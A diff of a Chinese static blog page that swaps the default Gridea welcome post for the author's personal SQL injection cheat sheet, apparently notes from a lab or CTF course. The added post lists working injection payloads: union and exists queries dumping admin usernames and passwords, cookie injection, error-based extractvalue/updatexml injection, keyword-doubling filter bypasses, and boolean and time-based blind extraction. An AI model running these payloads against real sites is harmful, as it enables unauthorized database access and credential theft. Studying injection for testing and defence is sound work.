@@ -8,7 +8,7 @@
 <meta name="keywords" content="Gridea静态个人博客">
 <meta name="description" content="不断的折腾，才能领悟作死的真谛！！！">
 <meta name="theme-color" content="#000">
-<title>Hello Gridea | 破站真水</title>
+<title>速查篇[sql注入]： | 破站真水</title>
 <link rel="shortcut icon" href="/favicon.ico?v=1611840965445">
 <link rel="stylesheet" href="/media/css/pisces.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
@@ -39,8 +39,8 @@
 
 
 
-  <meta name="description" content="Hello Gridea" />
-  <meta name="keywords" content="Gridea" />
+  <meta name="description" content="速查篇[sql注入]：" />
+  <meta name="keywords" content="" />
 </head>
 
 <body>
@@ -191,8 +191,7 @@
       <div class="sidebar-body pisces" id="sidebar_body">
         
           
-            <div class="post-side-meta" id="post_side_meta">
-              
+            
 <div class="sidebar-wrapper box-shadow-wrapper bg-color">
   <div class="sidebar-item">
     <img class="site-author-image right-motion" src="/images/avatar.png"/>
@@ -237,195 +236,6 @@
 
 
 </div>
-            </div>
-            <div class="post-toc sidebar-body-active" id="post_toc" style="opacity: 1;">
-              <div class="toc-box right-motion">
-  <div class="toc-wrapper auto-number auto"
-    id="toc_wrapper">
-    <ul class="markdownIt-TOC">
-<li>
-<ul>
-<li><a href="#%E7%89%B9%E6%80%A7">特性👇</a></li>
-</ul>
-</li>
-</ul>
-
-  </div>
-</div>
-
-<script>
-
-  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
-  let active = 'active-show', activeClass = 'active-current';
-  let tocWrapper = document.querySelector('#toc_wrapper');
-  let tocContent = tocWrapper.children[0];
-  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');
-
-  function addTocNumber(elem, deep) {
-    if (!elem) {
-      return;
-    }
-    let prop = elem.__proto__;
-
-    if (prop === HTMLUListElement.prototype) {
-      for (let i = 0; i < elem.children.length; i++) {
-        addTocNumber(elem.children[i], deep + (i + 1) + '.');
-      }
-    } else if (prop === HTMLLIElement.prototype) {
-      // 保存li元素
-      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
-        lList.push(elem);
-      }
-      for (let i = 0; i < elem.children.length; i++) {
-        let cur = elem.children[i];
-        if (cur.__proto__ === HTMLAnchorElement.prototype) {
-          if (autoNumber) {
-            cur.text = deep + ' ' + cur.text;
-          }
-        } else if (cur.__proto__ === HTMLUListElement.prototype) {
-          addTocNumber(cur, deep);
-        }
-      }
-    }
-  }
-
-  function removeParentActiveClass() {
-    let parents = tocContent.querySelectorAll('.' + active)
-    parents.forEach(function (elem) {
-      elem.classList.remove(active);
-    });
-  }
-
-  function addActiveClass(index) {
-    if (index >= 0 && index < hList.length) {
-      lList[index].classList.add(activeClass);
-    }
-  }
-
-  function removeActiveClass(index) {
-    if (index >= 0 && index < hList.length) {
-      lList[index].classList.remove(activeClass);
-    }
-  }
-
-  function addActiveLiElemment(elem, parent) {
-    if (!elem || elem === parent) {
-      return;
-    } else {
-      if (elem.__proto__ === HTMLLIElement.prototype) {
-        elem.classList.add(active);
-      }
-      addActiveLiElemment(elem.parentElement, parent);
-    }
-  }
-
-  function showToc() {
-    if (tocWrapper) {
-      postBody = document.querySelector('#post_body');
-      for (let i = 0; i < postBody.children.length; i++) {
-        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
-          hList.push(postBody.children[i]);
-        }
-      }
-      if (tocWrapper.classList.contains('compress')) {
-        tocContent.classList.add('closed');
-      } else if (tocWrapper.classList.contains('no_compress')) {
-        tocContent.classList.add('expanded');
-      } else {
-        if (hList.length > 10) {
-          active = 'active-hidden'
-          tocContent.classList.add('closed');
-        } else {
-          tocContent.classList.add('expanded');
-        }
-      }
-    }
-  }
-
-  (function () {
-    // 处理不是从#一级标题开始目录
-    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
-      let con = tocContent.children[0].children[0];
-      tocContent.innerHTML = con.innerHTML;
-    }
-    let markdownItTOC = document.querySelector('.markdownIt-TOC');
-    let innerHeight = window.innerHeight;
-    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
-    addTocNumber(tocContent, '');
-  })();
-
-  document.addEventListener('scroll', function (e) {
-    if (lList.length <= 0) {
-      return;
-    }
-    let scrollTop = document.scrollingElement.scrollTop + 10;
-    let dir;
-
-    if (lastTop - scrollTop > 0) {
-      dir = 'up';
-    } else {
-      dir = 'down';
-    }
-
-    lastTop = scrollTop;
-    if (scrollTop <= 0) {
-      if (lastIndex >= 0 && lastIndex < hList.length) {
-        lList[lastIndex].classList.remove(activeClass);
-      }
-      return;
-    }
-
-    let current = 0, hasFind = false;
-    for (let i = 0; i < hList.length; i++) {
-      if (hList[i].offsetTop > scrollTop) {
-        current = i;
-        hasFind = true;
-        break;
-      }
-    }
-    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
-      current = hList.length - 1;
-    } else {
-      current--;
-    }
-    if (dir === 'down') {
-      if (current > lastIndex) {
-        addActiveClass(current);
-        removeActiveClass(lastIndex)
-        lastIndex = current;
-        removeParentActiveClass();
-        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
-      }
-    } else {
-      if (current < lastIndex) {
-        addActiveClass(current);
-        removeActiveClass(lastIndex);
-        lastIndex = current;
-        removeParentActiveClass();
-        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
-      }
-    }
-  });
-
-
-  window.addEventListener('load', function () {
-    showToc();
-    document.querySelector('#sidebar').style = 'display: block;';
-    tocWrapper.classList.add('toc-active');
-    setTimeout(function () {
-      if ("createEvent" in document) {
-        let evt = document.createEvent("HTMLEvents");
-        evt.initEvent("scroll", false, true);
-        document.dispatchEvent(evt);
-      }
-      else {
-        document.fireEvent("scroll");
-      }
-    }, 500)
-  })
-
-</script>
-            </div>
           
         
       </div>
@@ -513,8 +323,8 @@
           <div class="section bg-color post post-page">
             <section class="post-header">
   <h1 class="post-title">
-    <a class="post-title-link" href="https://laoliang.shop/post/hello-gridea/">
-      Hello Gridea
+    <a class="post-title-link" href="https://laoliang.shop/post/su-cha-pian-sql-zhu-ru/">
+      速查篇[sql注入]：
     </a>
   </h1>
   <div class="post-meta">
@@ -522,36 +332,23 @@
     <span class="meta-item pc-show">
       <i class="fa fa-calendar-o"></i>
       <span class="language" data-lan="publish">发布于</span>
-      <span class="publish-time" data-t="2018-12-12 00:00:00">2018-12-12</span>
+      <span class="publish-time" data-t="2021-01-26 07:55:41">2021-01-26</span>
       <span class="post-meta-divider pc-show">|</span>
     </span>
     
     <span class="meta-item">
-      <i class="fa fa-folder-o"></i>
-      <span class="pc-show language" data-lan="category-in">分类于</span>
-      
-      
-      <a href="https://laoliang.shop/tag/FhMnNGYoP/">
-        <span>Gridea</span>
-      </a>
-      
-      
-    </span>
-    <span class="post-meta-divider">|</span>
-    
-    <span class="meta-item">
       <i class="fa fa-clock-o"></i>
-      <span>2<span class="language" data-lan="minute">分钟</span></span>
+      <span>5<span class="language" data-lan="minute">分钟</span></span>
     </span>
     <span class="meta-item">
       <span class="post-meta-divider">|</span>
       <i class="fa fa-file-word-o"></i>
-      <span>298<span class="pc-show language" data-lan="words">字数</span></span>
+      <span>1156<span class="pc-show language" data-lan="words">字数</span></span>
     </span>
     
     
     
-    <span id="/post/hello-gridea/" data-flag-title="Hello Gridea" class="meta-item pc-show leancloud_visitors">
+    <span id="/post/su-cha-pian-sql-zhu-ru/" data-flag-title="速查篇[sql注入]：" class="meta-item pc-show leancloud_visitors">
       <span class="post-meta-divider">|</span>
       <i class="fa fa-eye"></i>
       <span><span class="language" data-lan="view">浏览量</span>：<span class="leancloud-visitors-count"></span></span>
@@ -560,27 +357,82 @@
   </div>
 </section>
             <div class="post-body next-md-body" id="post_body">
-              <p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
-✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
-<!-- more -->
-<p><a href="https://github.com/getgridea/gridea">Github</a><br>
-<a href="https://gridea.dev/">Gridea 主页</a><br>
-<a href="http://fehey.com/">示例网站</a></p>
-<h2 id="特性">特性👇</h2>
-<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
-<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
-<p>🏷️  你可以对文章进行标签分组</p>
-<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
-<p>💻  你可以在 <strong>Windows</strong>，<strong>MacOS</strong> 或 <strong>Linux</strong> 设备上使用此客户端</p>
-<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
-<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
-<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
-<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
-<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
-<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前 🏃</p>
-<p>未来，它一定会成为你离不开的伙伴</p>
-<p>尽情发挥你的才华吧！</p>
-<p>😘 Enjoy~</p>
+              <p>这篇是本人自己用来测试时候备忘速查的，可能写的很乱，各位看官不要介意哦，从简单到复杂，但不包括全部，是目前自己目前学习，详细的可以看我笔记<br>
+基础：Referer:访问b网站是来自于a网站，记录表示你从哪里来，<br>
+user-agent：显示你访问设备<br>
+x-forwarded-for:记录你的IP<br>
+字段：表中的列称为字段<br>
+记录：表中的行称为记录<br>
++是%2b<br>
+在数据库里有一个系统库：information_schema<br>
+在它里面有个存着所有库名的表：schemata<br>
+schema_name 库名<br>
+在它里面有个存着所有表名的表：tables<br>
+表名<br>
+table_schema 表属于库<br>
+table_name  表名<br>
+在它里面还有个存着所有字段名的表：columns<br>
+table_schema 表属于库<br>
+table_name  表名<br>
+column_name 字段名<br>
+😕【access数据库】exists注入：<br>
+😀union select 1,2,3,4,5,6,7,8,9,10 from admin<br>
+【注：后面必须加一张表，此句作用判断一张表存不存在，而且不用and 1 =2，因为查询内容本来就在第一行】<br>
+😭and exists(select * from admin)<br>
+【注：exists()此句话判断admin存不存在，如果不存在，报错】<br>
+【要收集收集常见的表名，字段名】<br>
+🤡union select1，2，3，4，5，6，username，password，9，10 from admin<br>
+😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒😒<br>
+🙁【access数据库】cookie注入<br>
+【提交数据并非仅仅只有get\post这两种方式，还可以用cookie提交，对方可能对get\p6st这两种方式迸行拦截，现在判断是否可以通过cookie进行传参】<br>
+判断可不可以通过cookie传参：<br>
+按F12，打开存储，然后点cookie那块，然后将名称改为id 值改成171【例】，如果出现id=171界面就ok<br>
+😱id=171+order+by+10<br>
+😣id=171+union+select+1,2,3,4,5,6,7,8,9,10+from+admin<br>
+😡id=171+union+select+1,2,3,4,5,6,,username,password,9,10+from+admin<br>
+【注：可以用modheader也可以用hackbar】<br>
+😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐😐<br>
+post注入：【网页在通过post传参时候，注入点在post数据包】<br>
+报错注入：把我们想要的内容篇以报错的形式展现出来<br>
+😲extractvalue():对XML文档进行查询的函数示出来语法: extractvalue(目标xml文档，xml路径)，路径不能出现非法路径，否则会报错，select extractvalue(1,0x7e)，写非法字符，或用十六进制<br>
+😑concat():将多个字符串连接成一个字符串语法:concat(str1, str2,...)<br>
+select concat('~',(select database()))<br>
+select extractvalue(1,concat('~',（select database())))<br>
+笔记详见burp测试：<br>
+如果碰到过滤可以un union ion select 1,2,3,4,5--adfa<br>
+a and nd extraactvalue(1,concat(0x7e,(seselectlct database()),0x7e))--adc<br>
+😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤😤<br>
+盲注：<br>
+布尔：length()函数返回字符串的长度?id=1 and length(database())&gt;1可以大于号，小于号，等于号哦也可以使用大于等于和小于等于的方式<br>
+substr()截取字符串，从第一位截取一个<br>
+🤤?id=1 and substr(database(),1,1)='K'【&gt;,&lt;可以用大于小于号，也可以使用ascii码如?id=1 and ord (substr(database() ,1，1))=107【ord()/ascii()返回字符的asciii码】<br>
+substr:第一位：1，1 第二位   2，1<br>
+limit:       0,1 ：从第一行起显示一条记录<br>
+时间：sleep()将程序挂起一段时间n为n秒<br>
+if(expr1,expr2,expr3)判断语句如果第一个语句正确就执行第二个语句如果错误执行第三个语句<br>
+例如：?id=1' and lf(length(database())=8,0,sleep(5))-- +<br>
+select if(1=2,3,4)    select if(1=1,3,4) if：1=2错误，给4，1=1正确，给3<br>
+实战：<br>
+猜解当前数据库名称长度:<br>
+and (length(database()79#企观看视频猜解当前数据库名称:<br>
+and (ascii(substr(database(),1,1)))=107返回正常，说明数据库名称第一位是k<br>
+and substr(database(),1,1)='k’返回正常，说明数据库名称第二位是k<br>
+猜表名:<br>
+and length((select table_name from information_schema.tables where table_schema=database()limit 0,1))=6返回正常，说明当前数据库第一个表长度是6<br>
+and substr((select table_name from information_schema.tables where table_schema=kanwolongxia' limit 0,1),1,1)=I返回正常，说明数据库表名的第一个的第一位是l<br>
+猜字段名<br>
+and substr((select column_name from information_schema.columns where table_name=&quot;oflag&quot;limit0,1),1,1)=i'返回正常，说明loflag表中的列名称第一位是i<br>
+猜内容<br>
+and (asci(substr(( select flaglo from loflag limit 0,1),1,1)=122返回正常，说明zKaQ列第一位是z<br>
+可以用burp爆破<br>
+☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️☹️<br>
+head注入：<br>
+user_agent::判断访问设备，系统简称ua<br>
+插入进去：insert into 意思是擦汗如 beidiao是表，name，xingbie是位置，字段名，values后面紧跟这插入的内容<br>
+insert into beidiao(name,xingbie)values('heiyanquan','nan')<br>
+select updatexml(1,'~',1)<br>
+select concat('~',(select database()))<br>
+select updatexml (1,concat('~',select database())),1)</p>
 
             </div>
             
@@ -593,7 +445,7 @@
     </li>
     <li class="post-copyright-link">
       <strong class="language" data-lan="link">本文链接：</strong>
-      <a href="https://laoliang.shop/post/hello-gridea/" title="Hello Gridea">https://laoliang.shop/post/hello-gridea/</a>
+      <a href="https://laoliang.shop/post/su-cha-pian-sql-zhu-ru/" title="速查篇[sql注入]：">https://laoliang.shop/post/su-cha-pian-sql-zhu-ru/</a>
     </li>
     <li class="post-copyright-license">
       <strong class="language" data-lan="copyright">版权声明： </strong>
@@ -602,18 +454,16 @@
   </ul>
   <div class="tags">
     
-      <a href="https://laoliang.shop/tag/FhMnNGYoP/"># Gridea</a>
-    
   </div>
   <div class="nav">
     <div class="nav-prev">
       
-        <i class="fa fa-chevron-left"></i>
-        <a class="nav-pc-next" title="速查篇[sql注入]：" href="https://laoliang.shop/post/su-cha-pian-sql-zhu-ru/">速查篇[sql注入]：</a class="nav-pc-next">
-        <a class="nav-mobile-prev" title="速查篇[sql注入]：" href="https://laoliang.shop/post/su-cha-pian-sql-zhu-ru/">上一篇</a>
-      
     </div>
     <div class="nav-next">
+      
+        <a class="nav-pc-next" title="Hello Gridea" href="https://laoliang.shop/post/hello-gridea/">Hello Gridea</a>
+        <a class="nav-mobile-next" title="Hello Gridea" href="https://laoliang.shop/post/hello-gridea/">下一篇</a>
+        <i class="fa fa-chevron-right"></i>
       
     </div>
   </div>
